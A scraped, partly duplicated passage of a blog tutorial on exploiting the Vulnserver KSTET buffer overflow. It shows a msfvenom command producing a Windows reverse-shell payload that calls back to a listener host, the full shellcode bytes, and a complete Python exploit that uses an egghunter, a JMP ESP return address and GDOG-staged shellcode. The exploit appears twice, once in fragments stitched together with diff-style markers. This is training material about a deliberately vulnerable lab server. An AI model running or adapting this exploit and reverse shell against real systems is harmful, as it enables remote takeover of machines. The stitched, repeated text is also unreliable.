b”\x05\x86\xb5\x15\x55\x28\x66\xd6\x05\x88\xd6\xbe\x4f” buf += b”\x07\x08\xde\x70\xcd\x21\x75\x8b\x86\xe1\x9a\x8b\x9a” buf += b”\x92\x98\xab\x33\x3f\x14\x4d\x59\xaf\x70\xc6\xf6\x56” buf += b”\xd9\x9c\x67\x96\xf7\xd9\xa8\x1c\xf4\x1e\x66\xd5\x71” buf += b”\x0c\x1f\x15\xcc\x6e\xb6\x2a\xfa\x06\x54\xb8\x61\xd6” buf += b”\x13\xa1\x3d\x81\x74\x17\x34\x47\x69\x0e\xee\x75\x70” buf += b”\xd6\xc9\x3d\xaf\x2b\xd7\xbc\x22\x17\xf3\xae\xfa\x98” buf += b”\xbf\x9a\x52\xcf\x69\x74\x15\xb9\xdb\x2e\xcf\x16\xb2” buf += b”\xa6\x96\x54\x05\xb0\x96\xb0\xf3\x5c\x26\x6d\x42\x63” buf += b”\x87\xf9\x42\x1c\xf5\x99\xad\xf7\xbd\xba\x4f\xdd\xcb” buf += b”\x52\xd6\xb4\x71\x3f\xe9\x63\xb5\x46\x6a\x81\x46\xbd” buf += b”\x72\xe0\x43\xf9\x34\x19\x3e\x92\xd0\x1d\xed\x93\xf0”</p><p>shellcode = “GDOG “ + “w00tw00t” + buf buffer = “KSTET /.:/” + “\x90” * 20 + egghunter + (66- 20 - len(egghunter)) * “\x90” + JMP_ESP + “\x90\x90” + JMP_BCK + (5000 - 66 - len(JMP_ESP) - len(JMP_BCK) - 2) * “\x90”</p><p>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host,port)) print s.recv(1024) print “[+] Sending shellcode with GDOG command” s.send(shellcode) print s.recv(1024) print “[+] Sending egghunter” s.send(buffer) s.close()</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://raw.githubusercontent.com/smarinovic/smarinovic.github.io/master/assets/img/KSTET6.png" alt="Vulnserver KSTET" /></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/blogging/'>Blogging</a>, <a href='/categories/tutorial/'>Tutorial</a>, <a href='/categories/exploit/'>Exploit</a>, <a href='/categories/eip/'>EIP</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/fuzzing/" class="post-tag no-text-decoration" >fuzzing</a> <a href="/tags/shellcoding/" class="post-tag no-text-decoration" >shellcoding</a> <a href="/tags/exploit/" class="post-tag no-text-decoration" >exploit</a> <a href="/tags/bufferoverflow/" class="post-tag no-text-decoration" >bufferoverflow</a> <a href="/tags/bof/" class="post-tag no-text-decoration" >bof</a> <a href="/tags/eip/" class="post-tag no-text-decoration" >EIP</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Vulnserver KSTET buffer overflow - &url=https://smarinovic.github.io/posts/Vulnserver-KSTET-procmon/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Vulnserver KSTET buffer overflow - &u=https://smarinovic.github.io/posts/Vulnserver-KSTET-procmon/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Vulnserver KSTET buffer overflow - &url=https://smarinovic.github.io/posts/Vulnserver-KSTET-procmon/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <!-- The trending tags list v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT Licensed --> <a class="post-tag" href="/tags/fuzzing/">fuzzing</a> <a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/bufferoverflow/">bufferoverflow</a> <a class="post-tag" href="/tags/bof/">bof</a> <a class="post-tag" href="/tags/slae/">slae</a> <a class="post-tag" href="/tags/seh/">SEH</a> <a class="post-tag" href="/tags/encoder/">encoder</a> <a class="post-tag" href="/tags/egghunter/">egghunter</a> <a class="post-tag" href="/tags/decoder/">decoder</a> <a class="post-tag" href="/tags/eip/">EIP</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-3">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/KarajaSoft-Sami-2.0.2-FTP-BoF/" class="btn btn-outline-primary"><p>KarajaSoft Sami FTP 2.0.2 buffer overflow exploit</p></a> <span class="btn btn-outline-primary disabled"><p>-</p></span></div><!-- The related posts of current post. Placed in the bottom of every single post. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-4 mb-2 mb-sm-4 pb-2"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/MiniShare-webserver-BoF/"><div class="card-body"> <span class="timeago small"> Jul 12, 2020 <i class="unloaded">2020-07-12T17:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>MiniShare 1.4.1 webserver buffer overflow exploit</h3><div class="text-muted small"><p>Introduction MiniShare is a minimal web server with a simple GUI meant for fast and simple file sharing. It was released back in a days of Windows XP. Application has a buffer overflow vulnerabili...</p></div></div></a></div><div class="card"> <a href="/posts/MinaliC-webserver-BoF/"><div class="card-body"> <span class="timeago small"> Jul 13, 2020 <i class="unloaded">2020-07-13T17:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>MinaliC 2.0.0 buffer overflow exploit</h3><div class="text-muted small"><p>Introduction In this blog post we will go thru recreating buffer overflow exploit for MinaliC webserver. Application can be downloaded on following URL: https://sourceforge.net/projects/minalic/. ...</p></div></div></a></div><div class="card"> <a href="/posts/Savant-web-server-BoF/"><div class="card-body"> <span class="timeago small"> Jul 13, 2020 <i class="unloaded">2020-07-13T17:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Savant 3.1 webserver buffer overflow exploit</h3><div class="text-muted small"><p>Introduction Next in a series of recreating (rewriting) remote buffer overflow exploits is Savant 3.1. Based on description from SourceForge: Savant is a freeware open source web server that runs...</p></div></div></a></div></div></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const observer = lozad(); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2020 <a href="https://twitter.com/stipemarinovic">Stipe Marinovic</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank">Jekyll</a> with theme <a href="https://github.com/cotes2020/jekyll-theme-chirpy/">Chirpy</a>.</p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted">Trending Tags</h4><!-- The trending tags list v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT Licensed --> <a class="post-tag" href="/tags/fuzzing/">fuzzing</a> <a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/bufferoverflow/">bufferoverflow</a> <a class="post-tag" href="/tags/bof/">bof</a> <a class="post-tag" href="/tags/slae/">slae</a> <a class="post-tag" href="/tags/seh/">SEH</a> <a class="post-tag" href="/tags/encoder/">encoder</a> <a class="post-tag" href="/tags/egghunter/">egghunter</a> <a class="post-tag" href="/tags/decoder/">decoder</a> <a class="post-tag" href="/tags/eip/">EIP</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- The GA snippet v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-11473652-4', 'auto'); ga('send', 'pageview'); </script> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js" integrity="sha256-qcLR00zq6pJk4je3MLgAri8Nn+ZumUlXgTKR2H/xCY0=" crossorigin="anonymous"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://smarinovic.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
+</pre></table></code></div></div><p>and shell code (reverse shell)</p><ul><li>Shellcode</li></ul><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+</pre><td class="rouge-code"><pre>msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=172.16.24.204 LPORT=4444 -f python -b "\x00"
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+x86/shikata_ga_nai chosen with final size 351
+Payload size: 351 bytes
+Final size of python file: 1712 bytes
+buf =  b""
+buf += b"\xba\xc3\x14\x04\x48\xd9\xcd\xd9\x74\x24\xf4\x5e\x33"
+buf += b"\xc9\xb1\x52\x31\x56\x12\x83\xc6\x04\x03\x95\x1a\xe6"
+buf += b"\xbd\xe5\xcb\x64\x3d\x15\x0c\x09\xb7\xf0\x3d\x09\xa3"
+buf += b"\x71\x6d\xb9\xa7\xd7\x82\x32\xe5\xc3\x11\x36\x22\xe4"
+buf += b"\x92\xfd\x14\xcb\x23\xad\x65\x4a\xa0\xac\xb9\xac\x99"
+buf += b"\x7e\xcc\xad\xde\x63\x3d\xff\xb7\xe8\x90\xef\xbc\xa5"
+buf += b"\x28\x84\x8f\x28\x29\x79\x47\x4a\x18\x2c\xd3\x15\xba"
+buf += b"\xcf\x30\x2e\xf3\xd7\x55\x0b\x4d\x6c\xad\xe7\x4c\xa4"
+buf += b"\xff\x08\xe2\x89\xcf\xfa\xfa\xce\xe8\xe4\x88\x26\x0b"
+buf += b"\x98\x8a\xfd\x71\x46\x1e\xe5\xd2\x0d\xb8\xc1\xe3\xc2"
+buf += b"\x5f\x82\xe8\xaf\x14\xcc\xec\x2e\xf8\x67\x08\xba\xff"
+buf += b"\xa7\x98\xf8\xdb\x63\xc0\x5b\x45\x32\xac\x0a\x7a\x24"
+buf += b"\x0f\xf2\xde\x2f\xa2\xe7\x52\x72\xab\xc4\x5e\x8c\x2b"
+buf += b"\x43\xe8\xff\x19\xcc\x42\x97\x11\x85\x4c\x60\x55\xbc"
+buf += b"\x29\xfe\xa8\x3f\x4a\xd7\x6e\x6b\x1a\x4f\x46\x14\xf1"
+buf += b"\x8f\x67\xc1\x56\xdf\xc7\xba\x16\x8f\xa7\x6a\xff\xc5"
+buf += b"\x27\x54\x1f\xe6\xed\xfd\x8a\x1d\x66\xae\x5b\x05\xba"
+buf += b"\xc6\x59\x35\x53\x4b\xd7\xd3\x39\x63\xb1\x4c\xd6\x1a"
+buf += b"\x98\x06\x47\xe2\x36\x63\x47\x68\xb5\x94\x06\x99\xb0"
+buf += b"\x86\xff\x69\x8f\xf4\x56\x75\x25\x90\x35\xe4\xa2\x60"
+buf += b"\x33\x15\x7d\x37\x14\xeb\x74\xdd\x88\x52\x2f\xc3\x50"
+buf += b"\x02\x08\x47\x8f\xf7\x97\x46\x42\x43\xbc\x58\x9a\x4c"
+buf += b"\xf8\x0c\x72\x1b\x56\xfa\x34\xf5\x18\x54\xef\xaa\xf2"
+buf += b"\x30\x76\x81\xc4\x46\x77\xcc\xb2\xa6\xc6\xb9\x82\xd9"
+buf += b"\xe7\x2d\x03\xa2\x15\xce\xec\x79\x9e\xfe\xa6\x23\xb7"
+buf += b"\x96\x6e\xb6\x85\xfa\x90\x6d\xc9\x02\x13\x87\xb2\xf0"
+buf += b"\x0b\xe2\xb7\xbd\x8b\x1f\xca\xae\x79\x1f\x79\xce\xab"
+</pre></table></code></div></div><h2 id="final-exploit">Final exploit</h2><p>The is no space for including shell code in our payload, we need to use some other command to send shellcode and then use egghunter to find it in memory. Several commands like: STATS and GDOG are keeping payload in memory so we could use one of these commands to send tagged (with egg) payload and find it with our egghunter.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+</pre><td class="rouge-code"><pre>#!/usr/bin/python
+import socket
+
+host = "172.16.24.212"
+port = 9999
+
+# JMP ESP: 0x625011af
+JMP_ESP = "\xaf\x11\x50\x62"
+JMP_BCK = "\x83\xEC\x44\xff\xe4"  # sub esp, 68; jmp esp
+# we could also use: JMP_BCK = "\xeb\xb8"
+
+# EGG: w00t
+
+egghunter =  b""
+egghunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
+egghunter += b"\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75"
+egghunter += b"\xea\xaf\x75\xe7\xff\xe7"
+
+#msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=172.16.24.204 LPORT=4444 -f python -b "\x00" EXITFUNC=thread
+#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+#Found 11 compatible encoders
+#Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+#x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+#x86/shikata_ga_nai chosen with final size 351
+#Payload size: 351 bytes
+#Final size of python file: 1712 bytes
+
+buf =  b""
+buf += b"\xb8\x4a\xf5\x4f\x87\xdb\xd0\xd9\x74\x24\xf4\x5d\x33"
+buf += b"\xc9\xb1\x52\x83\xc5\x04\x31\x45\x0e\x03\x0f\xfb\xad"
+buf += b"\x72\x73\xeb\xb0\x7d\x8b\xec\xd4\xf4\x6e\xdd\xd4\x63"
+buf += b"\xfb\x4e\xe5\xe0\xa9\x62\x8e\xa5\x59\xf0\xe2\x61\x6e"
+buf += b"\xb1\x49\x54\x41\x42\xe1\xa4\xc0\xc0\xf8\xf8\x22\xf8"
+buf += b"\x32\x0d\x23\x3d\x2e\xfc\x71\x96\x24\x53\x65\x93\x71"
+buf += b"\x68\x0e\xef\x94\xe8\xf3\xb8\x97\xd9\xa2\xb3\xc1\xf9"
+buf += b"\x45\x17\x7a\xb0\x5d\x74\x47\x0a\xd6\x4e\x33\x8d\x3e"
+buf += b"\x9f\xbc\x22\x7f\x2f\x4f\x3a\xb8\x88\xb0\x49\xb0\xea"
+buf += b"\x4d\x4a\x07\x90\x89\xdf\x93\x32\x59\x47\x7f\xc2\x8e"
+buf += b"\x1e\xf4\xc8\x7b\x54\x52\xcd\x7a\xb9\xe9\xe9\xf7\x3c"
+buf += b"\x3d\x78\x43\x1b\x99\x20\x17\x02\xb8\x8c\xf6\x3b\xda"
+buf += b"\x6e\xa6\x99\x91\x83\xb3\x93\xf8\xcb\x70\x9e\x02\x0c"
+buf += b"\x1f\xa9\x71\x3e\x80\x01\x1d\x72\x49\x8c\xda\x75\x60"
+buf += b"\x68\x74\x88\x8b\x89\x5d\x4f\xdf\xd9\xf5\x66\x60\xb2"
+buf += b"\x05\x86\xb5\x15\x55\x28\x66\xd6\x05\x88\xd6\xbe\x4f"
+buf += b"\x07\x08\xde\x70\xcd\x21\x75\x8b\x86\xe1\x9a\x8b\x9a"
+buf += b"\x92\x98\xab\x33\x3f\x14\x4d\x59\xaf\x70\xc6\xf6\x56"
+buf += b"\xd9\x9c\x67\x96\xf7\xd9\xa8\x1c\xf4\x1e\x66\xd5\x71"
+buf += b"\x0c\x1f\x15\xcc\x6e\xb6\x2a\xfa\x06\x54\xb8\x61\xd6"
+buf += b"\x13\xa1\x3d\x81\x74\x17\x34\x47\x69\x0e\xee\x75\x70"
+buf += b"\xd6\xc9\x3d\xaf\x2b\xd7\xbc\x22\x17\xf3\xae\xfa\x98"
+buf += b"\xbf\x9a\x52\xcf\x69\x74\x15\xb9\xdb\x2e\xcf\x16\xb2"
+buf += b"\xa6\x96\x54\x05\xb0\x96\xb0\xf3\x5c\x26\x6d\x42\x63"
+buf += b"\x87\xf9\x42\x1c\xf5\x99\xad\xf7\xbd\xba\x4f\xdd\xcb"
+buf += b"\x52\xd6\xb4\x71\x3f\xe9\x63\xb5\x46\x6a\x81\x46\xbd"
+buf += b"\x72\xe0\x43\xf9\x34\x19\x3e\x92\xd0\x1d\xed\x93\xf0"
+
+shellcode = "GDOG " + "w00tw00t" + buf 
+buffer = "KSTET /.:/" + "\x90" * 20 + egghunter + (66- 20 - len(egghunter)) * "\x90" + JMP_ESP + "\x90\x90" + JMP_BCK + (5000 - 66 - len(JMP_ESP) - len(JMP_BCK) - 2) * "\x90"
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host,port))
+print s.recv(1024)
+print "[+] Sending shellcode with GDOG command"
+s.send(shellcode)
+print s.recv(1024)
+print "[+] Sending egghunter"
+s.send(buffer)
+s.close()
+</pre></table></code></div></div><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://raw.githubusercontent.com/smarinovic/smarinovic.github.io/master/assets/img/KSTET6.png" alt="Vulnserver KSTET" /></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/blogging/'>Blogging</a>, <a href='/categories/tutorial/'>Tutorial</a>, <a href='/categories/exploit/'>Exploit</a>, <a href='/categories/eip/'>EIP</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/fuzzing/" class="post-tag no-text-decoration" >fuzzing</a> <a href="/tags/shellcoding/" class="post-tag no-text-decoration" >shellcoding</a> <a href="/tags/exploit/" class="post-tag no-text-decoration" >exploit</a> <a href="/tags/bufferoverflow/" class="post-tag no-text-decoration" >bufferoverflow</a> <a href="/tags/bof/" class="post-tag no-text-decoration" >bof</a> <a href="/tags/eip/" class="post-tag no-text-decoration" >EIP</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Vulnserver KSTET buffer overflow - &url=https://smarinovic.github.io/posts/Vulnserver-KSTET-procmon/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Vulnserver KSTET buffer overflow - &u=https://smarinovic.github.io/posts/Vulnserver-KSTET-procmon/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Vulnserver KSTET buffer overflow - &url=https://smarinovic.github.io/posts/Vulnserver-KSTET-procmon/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <!-- The trending tags list v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT Licensed --> <a class="post-tag" href="/tags/fuzzing/">fuzzing</a> <a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/bufferoverflow/">bufferoverflow</a> <a class="post-tag" href="/tags/bof/">bof</a> <a class="post-tag" href="/tags/slae/">slae</a> <a class="post-tag" href="/tags/seh/">SEH</a> <a class="post-tag" href="/tags/encoder/">encoder</a> <a class="post-tag" href="/tags/egghunter/">egghunter</a> <a class="post-tag" href="/tags/decoder/">decoder</a> <a class="post-tag" href="/tags/eip/">EIP</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-3">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/KarajaSoft-Sami-2.0.2-FTP-BoF/" class="btn btn-outline-primary"><p>KarajaSoft Sami FTP 2.0.2 buffer overflow exploit</p></a> <span class="btn btn-outline-primary disabled"><p>-</p></span></div><!-- The related posts of current post. Placed in the bottom of every single post. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-4 mb-2 mb-sm-4 pb-2"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/MiniShare-webserver-BoF/"><div class="card-body"> <span class="timeago small"> Jul 12, 2020 <i class="unloaded">2020-07-12T17:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>MiniShare 1.4.1 webserver buffer overflow exploit</h3><div class="text-muted small"><p>Introduction MiniShare is a minimal web server with a simple GUI meant for fast and simple file sharing. It was released back in a days of Windows XP. Application has a buffer overflow vulnerabili...</p></div></div></a></div><div class="card"> <a href="/posts/MinaliC-webserver-BoF/"><div class="card-body"> <span class="timeago small"> Jul 13, 2020 <i class="unloaded">2020-07-13T17:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>MinaliC 2.0.0 buffer overflow exploit</h3><div class="text-muted small"><p>Introduction In this blog post we will go thru recreating buffer overflow exploit for MinaliC webserver. Application can be downloaded on following URL: https://sourceforge.net/projects/minalic/. ...</p></div></div></a></div><div class="card"> <a href="/posts/Savant-web-server-BoF/"><div class="card-body"> <span class="timeago small"> Jul 13, 2020 <i class="unloaded">2020-07-13T17:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Savant 3.1 webserver buffer overflow exploit</h3><div class="text-muted small"><p>Introduction Next in a series of recreating (rewriting) remote buffer overflow exploits is Savant 3.1. Based on description from SourceForge: Savant is a freeware open source web server that runs...</p></div></div></a></div></div></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const observer = lozad(); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2020 <a href="https://twitter.com/stipemarinovic">Stipe Marinovic</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank">Jekyll</a> with theme <a href="https://github.com/cotes2020/jekyll-theme-chirpy/">Chirpy</a>.</p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted">Trending Tags</h4><!-- The trending tags list v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT Licensed --> <a class="post-tag" href="/tags/fuzzing/">fuzzing</a> <a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/bufferoverflow/">bufferoverflow</a> <a class="post-tag" href="/tags/bof/">bof</a> <a class="post-tag" href="/tags/slae/">slae</a> <a class="post-tag" href="/tags/seh/">SEH</a> <a class="post-tag" href="/tags/encoder/">encoder</a> <a class="post-tag" href="/tags/egghunter/">egghunter</a> <a class="post-tag" href="/tags/decoder/">decoder</a> <a class="post-tag" href="/tags/eip/">EIP</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- The GA snippet v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-11473652-4', 'auto'); ga('send', 'pageview'); </script> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js" integrity="sha256-qcLR00zq6pJk4je3MLgAri8Nn+ZumUlXgTKR2H/xCY0=" crossorigin="anonymous"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://smarinovic.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
